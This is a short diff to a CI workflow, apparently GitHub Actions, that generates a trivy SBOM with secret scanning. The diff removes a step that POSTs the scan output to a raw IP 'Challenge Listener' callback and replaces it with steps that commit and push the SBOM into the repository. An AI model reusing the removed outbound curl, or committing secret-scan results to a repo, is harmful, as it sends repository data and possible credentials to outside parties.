@@ -22,13 +22,13 @@ jobs:
         mkdir -p sbom-results
         trivy fs . --scanners vuln,secret --format cyclonedx --output sbom-results/sbom.json || true
 
-    - name: Send SBOM to Challenge Listener
+    - name: Copy SBOM to root for commit
+      run: cp sbom-results/sbom.json ./sbom.json
+
+    - name: Commit SBOM to repo
       run: |
-        if [ -f sbom-results/sbom.json ]; then
-        curl -X POST -H "Content-Type: application/json" \
-        --data @sbom-results/sbom.json \
-        http://35.219.182.3:8880/callback
-        else
-        echo "SBOM file not found. Skipping callback."
-        exit 1
-        fi
+        git config --global user.name "github-actions"
+        git config --global user.email "github-actions@github.com"
+        git add sbom.json
+        git commit -m "Add generated SBOM for review" || echo "No changes to commit"
+        git push
